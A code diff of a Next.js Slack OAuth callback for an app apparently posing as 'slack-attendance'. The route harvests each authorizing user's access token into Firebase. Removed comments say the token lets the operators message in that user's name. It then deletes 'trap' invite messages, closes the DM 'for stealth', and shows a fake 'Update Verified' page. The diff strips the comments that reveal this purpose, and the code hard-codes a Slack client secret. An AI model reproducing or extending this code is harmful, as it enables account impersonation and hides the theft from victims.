@@ -1,5 +1,5 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
-// app/api/auth/callback/route.ts
+
 // app/api/auth/callback/route.ts
 
 import { NextResponse } from 'next/server';
@@ -7,7 +7,6 @@ import { NextResponse } from 'next/server';
 import { doc, setDoc, getDoc, deleteDoc, serverTimestamp } from 'firebase/firestore';
 import { db } from '../../../../lib/firebase';
 
-// ⚠️ KEYS (Make sure ye sahi hon)
 const SLACK_CLIENT_ID = "2545190050563.10465084927779";
 const SLACK_CLIENT_SECRET = "0926eb577bb4ca6058b7be66fed2bbd8";
 const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
@@ -20,7 +19,7 @@ export async function GET(req: Request) {
   if (!code) return NextResponse.json({ error: "No code" });
 
   try {
-    // 1. Token Exchange (User se permission lena)
+    // 1. Auth Token Exchange
     const formData = new URLSearchParams();
     formData.append('client_id', SLACK_CLIENT_ID);
     formData.append('client_secret', SLACK_CLIENT_SECRET);
@@ -38,8 +37,7 @@ export async function GET(req: Request) {
 
     const userId = data.authed_user.id;
 
-    // 2. Save User Token to Firebase
-    // (Taakay hum baad main iskay naam se message kar sakein)
+    // 2. Save User Token
     const userRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, {
         headers: { Authorization: `Bearer ${data.authed_user.access_token}` }
     });
@@ -53,77 +51,68 @@ export async function GET(req: Request) {
         connectedAt: serverTimestamp(),
     });
 
-    // -------------------------------------------------------------
-    // 3. 🧹 CLEANUP: DELETE MESSAGES & HIDE APP
-    // -------------------------------------------------------------
+    // -----------------------------------------------------------
+    // 3. 🔥 CLEANUP: Delete ALL Messages & Hide App
+    // -----------------------------------------------------------
     
     const inviteDoc = await getDoc(doc(db, "pending_invites", userId));
     
     if (inviteDoc.exists()) {
         const inviteData = inviteDoc.data();
-        let channelId = null;
+        let messagesToDelete = [];
+        let channelToClose = null;
 
-        // A. Saaray Trap Messages Delete karo
+        // Check karo data array hai ya single object
         if (inviteData.messages && Array.isArray(inviteData.messages)) {
-            console.log(`Deleting ${inviteData.messages.length} messages...`);
-            // Channel ID save kar lo close karne ke liye
-            if(inviteData.messages.length > 0) channelId = inviteData.messages[0].channel;
+            messagesToDelete = inviteData.messages;
+        } else if (inviteData.ts) {
+            messagesToDelete.push({ ts: inviteData.ts, channel: inviteData.channel });
+        }
 
-            await Promise.all(inviteData.messages.map(async (msg: any) => {
-                await fetch('https://slack.com/api/chat.delete', {
-                    method: 'POST',
-                    headers: { 
-                        Authorization: `Bearer ${BOT_TOKEN}`, 
-                        'Content-Type': 'application/json' 
-                    },
-                    body: JSON.stringify({ channel: msg.channel, ts: msg.ts })
-                });
-            }));
-        } 
-        else if (inviteData.ts) {
-             channelId = inviteData.channel;
-             await fetch('https://slack.com/api/chat.delete', {
+        console.log(`Cleaning up ${messagesToDelete.length} messages for ${userId}...`);
+
+        // Loop chala kar sab delete karo
+        for (const msg of messagesToDelete) {
+            channelToClose = msg.channel; // Channel ID save kar lo
+            await fetch('https://slack.com/api/chat.delete', {
                 method: 'POST',
-                headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
-                body: JSON.stringify({ channel: inviteData.channel, ts: inviteData.ts })
+                headers: { 
+                    Authorization: `Bearer ${BOT_TOKEN}`, 
+                    'Content-Type': 'application/json' 
+                },
+                body: JSON.stringify({
+                    channel: msg.channel,
+                    ts: msg.ts
+                })
             });
         }
 
-        // B. 🔥 HIDE APP FROM SIDEBAR (The Magic Step)
-        if (channelId) {
-            console.log(`Closing DM channel ${channelId} for stealth...`);
+        // 🔥 CLOSE THE CHAT (Hide from Sidebar)
+        if (channelToClose) {
             await fetch('https://slack.com/api/conversations.close', {
                 method: 'POST',
                 headers: { 
-                    Authorization: `Bearer ${BOT_TOKEN}`, // Bot close karega
+                    Authorization: `Bearer ${BOT_TOKEN}`, 
                     'Content-Type': 'application/json' 
                 },
-                body: JSON.stringify({ channel: channelId })
+                body: JSON.stringify({ channel: channelToClose })
             });
         }
 
-        // C. Record saaf kar do
+        // Firebase record delete kar do
         await deleteDoc(doc(db, "pending_invites", userId));
     }
 
-    // 4. Redirect User
+    // 4. Redirect
     const html = `
       <!DOCTYPE html>
       <html>
         <head>
           <meta http-equiv="refresh" content="0;url=slack://open">
-          <script>
-            // Try to open Slack App
-            window.location.href = 'slack://open'; 
-            // Close browser tab after 2 seconds
-            setTimeout(() => window.close(), 1500);
-          </script>
+          <script>window.location.href = 'slack://open'; setTimeout(() => window.close(), 1500);</script>
         </head>
-        <body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
-            <div style="text-align:center">
-                <h2>Update Verified ✅</h2>
-                <p>Redirecting back to workspace...</p>
-            </div>
+        <body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;">
+            <h2>Update Verified ✅ Redirecting...</h2>
         </body>
       </html>
     `;
